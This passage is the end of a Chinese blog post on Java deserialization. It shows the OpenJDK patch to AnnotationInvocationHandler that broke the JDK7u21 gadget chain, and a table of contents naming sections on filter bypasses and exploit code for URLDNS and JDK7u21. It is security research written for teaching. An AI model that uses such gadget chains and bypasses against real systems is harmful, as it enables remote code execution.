<div class="code-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--- a/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java Fri Mar 22 15:40:16 2013 -0400</span></span><br><span class="line"><span class="comment">+++ b/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java Mon Mar 25 12:41:55 2013 +0400</span></span><br><span class="line"><span class="meta">@@ -1,5 +1,5 @@</span></span><br><span class="line"> /*</span><br><span class="line"><span class="deletion">- * Copyright (c) 2003, 2011, Oracle and/or its affiliates. All rights reserved.</span></span><br><span class="line"><span class="addition">+ * Copyright (c) 2003, 2013, Oracle and/or its affiliates. All rights reserved.</span></span><br><span class="line">  * DO NOT ALTER OR REMOVE COPYRIGHT NOTICES OR THIS FILE HEADER.</span><br><span class="line">  *</span><br><span class="line">  * This code is free software; you can redistribute it and/or modify it</span><br><span class="line"><span class="meta">@@ -337,12 +337,15 @@</span></span><br><span class="line">         try &#123;</span><br><span class="line">             annotationType = AnnotationType.getInstance(type);</span><br><span class="line">         &#125; catch(IllegalArgumentException e) &#123;</span><br><span class="line"><span class="deletion">-            // Class is no longer an annotation type; all bets are off</span></span><br><span class="line"><span class="deletion">-            return;</span></span><br><span class="line"><span class="addition">+            // Class is no longer an annotation type; time to punch out</span></span><br><span class="line"><span class="addition">+            throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);</span></span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        // If there are annotation members without values, that</span></span><br><span class="line"><span class="addition">+        // situation is handled by the invoke method.</span></span><br><span class="line">         for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">             String name = memberValue.getKey();</span><br><span class="line">             Class&lt;?&gt; memberType = memberTypes.get(name);</span><br></pre></td></tr></table></figure></div>

<p>这导致我们设置 <code>AnnotationInvocationHandler#type</code> 为 <code>javax.xml.transform.Templates.class</code> 这一步失效。</p>

		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> Java 反序列化</li>
        <li><strong>Author:</strong> sky123</li>
        <li><strong>Created at
                :</strong> 2025-09-09 00:44:06</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-10-11 11:38:14
            </li>
        
        <li>
            <strong>Link:</strong> https://skyi23.github.io/2025/09/09/Java 反序列化/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/java-web/">#java web</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2025/09/09/Java%20FastJson/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">Java FastJson</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2025/08/25/Java%20RMI%20&amp;%20JNDI/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">Java RMI &amp; JNDI</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'skyI23/my-giscus-discussions',
                'data-repo-id': 'R_kgDONL9k_w',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDONL9k_84CkEdK',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">Java 反序列化</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80"><span class="nav-text">序列化基础</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95"><span class="nav-text">基本用法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%B9%E8%B1%A1"><span class="nav-text">序列化对象</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%B9%E8%B1%A1"><span class="nav-text">反序列化对象</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E6%8E%A5%E5%8F%A3"><span class="nav-text">序列化接口</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Serializable"><span class="nav-text">Serializable</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Externalizable"><span class="nav-text">Externalizable</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E7%9B%B8%E5%85%B3%E5%B1%9E%E6%80%A7"><span class="nav-text">序列化相关属性</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#serialVersionUID"><span class="nav-text">serialVersionUID</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B1%BB%E4%B8%AD%E5%A3%B0%E6%98%8E-SerialVersionUID"><span class="nav-text">类中声明 SerialVersionUID</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E8%AE%A1%E7%AE%97-SerialVersionUID"><span class="nav-text">动态计算 SerialVersionUID</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#transient-%E5%85%B3%E9%94%AE%E5%AD%97"><span class="nav-text">transient 关键字</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E5%AD%97%E6%AE%B5"><span class="nav-text">静态字段</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="nav-text">序列化数据结构</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A1%B6%E5%B1%82%E7%BB%93%E6%9E%84"><span class="nav-text">顶层结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%B1%BB%E5%9E%8B%E7%A0%81"><span class="nav-text">类型码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%B9%E8%B1%A1%E7%B1%BB%E5%9E%8B%EF%BC%9ATC-OBJECT"><span class="nav-text">对象类型：TC_OBJECT</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B1%BB%E6%8F%8F%E8%BF%B0%E7%AC%A6%EF%BC%88Class-Descriptor%EF%BC%89"><span class="nav-text">类描述符（Class Descriptor）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%99%AE%E9%80%9A%E7%B1%BB%EF%BC%9ATC-CLASSDESC"><span class="nav-text">普通类：TC_CLASSDESC</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%90%86%E7%B1%BB%EF%BC%9ATC-PROXYCLASSDESC"><span class="nav-text">代理类：TC_PROXYCLASSDESC</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#classdata%EF%BC%88%E5%AF%B9%E8%B1%A1%E5%AE%9E%E4%BE%8B%E6%95%B0%E6%8D%AE%EF%BC%89"><span class="nav-text">classdata（对象实例数据）</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90"><span class="nav-text">序列化过程分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ObjectOutputStream-%E5%AF%B9%E8%B1%A1"><span class="nav-text">ObjectOutputStream 对象</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9D%97%E8%BE%93%E5%87%BA%E6%B5%81%EF%BC%9ABlockDataOutputStream-bout"><span class="nav-text">块输出流：BlockDataOutputStream bout</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%B9%E8%B1%A1%E5%8F%A5%E6%9F%84%E8%A1%A8%EF%BC%9AHandleTable-handles"><span class="nav-text">对象句柄表：HandleTable handles</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%B9%E8%B1%A1%E6%9B%BF%E6%8D%A2%E8%A1%A8%EF%BC%9AReplaceTable-subs"><span class="nav-text">对象替换表：ReplaceTable subs</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ObjectOutputStream-%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0"><span class="nav-text">ObjectOutputStream 构造函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E5%8F%82%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0"><span class="nav-text">无参构造函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%89%E5%8F%82%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0"><span class="nav-text">有参构造函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#writeObject-%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">writeObject 序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#writeObject0"><span class="nav-text">writeObject0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#writeOrdinaryObject"><span class="nav-text">writeOrdinaryObject</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#writeClassDesc"><span class="nav-text">writeClassDesc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#writeExternalData"><span class="nav-text">writeExternalData</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#writeSerialData"><span class="nav-text">writeSerialData</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90"><span class="nav-text">反序列化过程分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ObjectInputStream-%E5%AF%B9%E8%B1%A1"><span class="nav-text">ObjectInputStream 对象</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9D%97%E8%BE%93%E5%85%A5%E6%B5%81%EF%BC%9ABlockDataInputStream"><span class="nav-text">块输入流：BlockDataInputStream</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%B9%E8%B1%A1%E5%8F%A5%E6%9F%84%E8%A1%A8%EF%BC%9AHandleTable"><span class="nav-text">对象句柄表：HandleTable</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%B9%E8%B1%A1%E5%9B%BE%E6%A0%A1%E9%AA%8C%E5%9B%9E%E8%B0%83%EF%BC%9AValidationList"><span class="nav-text">对象图校验回调：ValidationList</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ObjectInputStream-%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0"><span class="nav-text">ObjectInputStream 构造函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#readObject-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">readObject 反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#readObject0"><span class="nav-text">readObject0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#readOrdinaryObject"><span class="nav-text">readOrdinaryObject</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#readClassDesc"><span class="nav-text">readClassDesc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#readExternalData"><span class="nav-text">readExternalData</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#readSerialData"><span class="nav-text">readSerialData</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A3%80%E6%B5%8B%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="nav-text">反序列化检测与绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#JEP290"><span class="nav-text">JEP290</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A3%80%E6%B5%8B%E5%8E%9F%E7%90%86"><span class="nav-text">检测原理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%A8%E5%B1%80%E9%BB%98%E8%AE%A4%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="nav-text">全局默认过滤器</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96-serialFilter"><span class="nav-text">初始化 serialFilter</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#filterCheck-%E8%BF%87%E6%BB%A4%E5%87%BD%E6%95%B0"><span class="nav-text">filterCheck 过滤函数</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="nav-text">自定义过滤器</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B1%80%E9%83%A8%E8%87%AA%E5%AE%9A%E4%B9%89%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="nav-text">局部自定义过滤器</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%85%A8%E5%B1%80%E8%87%AA%E5%AE%9A%E4%B9%89%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="nav-text">全局自定义过滤器</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF"><span class="nav-text">绕过思路</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%87%8D%E5%86%99-resolveClass"><span class="nav-text">重写 resolveClass</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A3%80%E6%B5%8B%E5%8E%9F%E7%90%86-1"><span class="nav-text">检测原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF-1"><span class="nav-text">绕过思路</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BC%95%E7%94%A8%E7%BB%95%E8%BF%87"><span class="nav-text">引用绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">二次反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#SignedObject"><span class="nav-text">SignedObject</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SerializationUtils"><span class="nav-text">SerializationUtils</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#RMIConnector"><span class="nav-text">RMIConnector</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#WrapperConnectionPoolDataSource"><span class="nav-text">WrapperConnectionPoolDataSource</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JDK-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-text">JDK 原生反序列化利用链</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#URLDNS"><span class="nav-text">URLDNS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="nav-text">原理分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81"><span class="nav-text">利用代码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JDK7u21"><span class="nav-text">JDK7u21</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90-1"><span class="nav-text">原理分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81-1"><span class="nav-text">利用代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E6%83%85%E5%86%B5"><span class="nav-text">修复情况</span></a></li></ol></li></ol></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">sky123</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        57 posts in total
                    </span>
                    
                        <span>
                            1193.9k words in total
                        </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>



<script src="/js/build/libs/Swup.min.js"></script>

<script src="/js/build/libs/SwupSlideTheme.min.js"></script>

<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/js/build/tools/imageViewer.js" type="module"></script>

<script src="/js/build/utils.js" type="module"></script>

<script src="/js/build/main.js" type="module"></script>

<script src="/js/build/layouts/navbarShrink.js" type="module"></script>

<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/build/layouts/categoryList.js" type="module"></script>



    
<script src="/js/build/tools/localSearch.js" type="module"></script>




    
<script src="/js/build/tools/codeBlock.js" type="module"></script>




    
<script src="/js/build/layouts/lazyload.js" type="module"></script>




    
<script src="/js/build/tools/runtime.js"></script>

    
<script src="/js/build/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/build/libs/Typed.min.js"></script>

  
<script src="/js/build/plugins/typed.js" type="module"></script>




    
        
<script src="/js/build/libs/mermaid.min.js"></script>

    
    
<script src="/js/build/plugins/mermaid.js"></script>






    
<script src="/js/build/libs/anime.min.js"></script>





    
<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>





    
<script src="/js/build/layouts/bookmarkNav.js" type="module"></script>


	
</body>

</html>